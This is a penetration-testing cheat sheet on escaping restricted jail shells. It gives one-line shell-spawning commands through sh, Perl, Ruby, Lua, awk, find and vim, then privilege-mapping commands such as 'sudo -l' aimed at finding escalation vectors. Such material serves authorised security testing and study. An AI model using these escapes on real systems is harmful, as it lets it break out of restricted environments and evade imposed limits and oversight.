## Shell Spawning via Native Interpreters

Land on a limited jail shell and need a TTY or prompt access while Python is unavailable.

Invoke the native shell interpreter in interactive mode

```
/bin/sh -i
```

Execute a shell via Perl from the command line

```
perl -e 'exec "/bin/sh";'
```

Spawn a shell from within a Perl script

```
exec "/bin/sh";
```

Spawn a shell from within a Ruby script

```
exec "/bin/sh"
```

Spawn a shell from within a Lua script

```
os.execute('/bin/sh')
```

### Tool comparison

- Perl → `perl -e 'exec "/bin/sh";'` → Prefer when Perl is available for one-liners
- Ruby → `exec "/bin/sh"` → Prefer for script-based execution
- Lua → `os.execute('/bin/sh')` → Use when the system relies on Lua-based tools

**Gotchas** **Unstable shells** may provide a prompt but fail to return output for complex commands or job control.

---

## Shell Spawning via System Utilities

Direct shell escape is blocked but AWK, Find, or VIM are present with execution permissions.

Spawn an interactive shell using AWK's system method

```
awk 'BEGIN {system("/bin/sh")}'
```

Execute a shell via Find's execute flag directly

```
find . -exec /bin/sh ; -quit
```

Chain Find and AWK to spawn a shell

```
find / -name <FILE_NAME> -exec /bin/awk 'BEGIN {system("/bin/sh")}' ;
```

Launch a shell directly from VIM startup

```
vim -c ':!/bin/sh'
```

Escape to a shell from an active VIM session

```
:set shell=/bin/sh
:shell
```

### Tool comparison

- Find → `find . -exec /bin/sh ; -quit` → Faster direct escape
- AWK → `awk 'BEGIN {system("/bin/sh")}'` → Useful when binary execution is limited to specific C-like languages
- VIM → `vim -c ':!/bin/sh'` → Niche escape used primarily when editing files

### Edge cases

- Find requires a successful file match to trigger the `-exec` flag; if Find **cannot find the specified file**, no shell is attained.

---

## Local Privilege and Permission Mapping

Shell is established and you need to determine execution rights or identify privilege escalation vectors.

List properties and account permissions for a specific binary or file

```
ls -la <FILE_PATH>
```

Check current user sudo permissions

```
sudo -l
```

**Gotchas** Running `sudo -l` while in an **unstable shell** will result in no output being returned.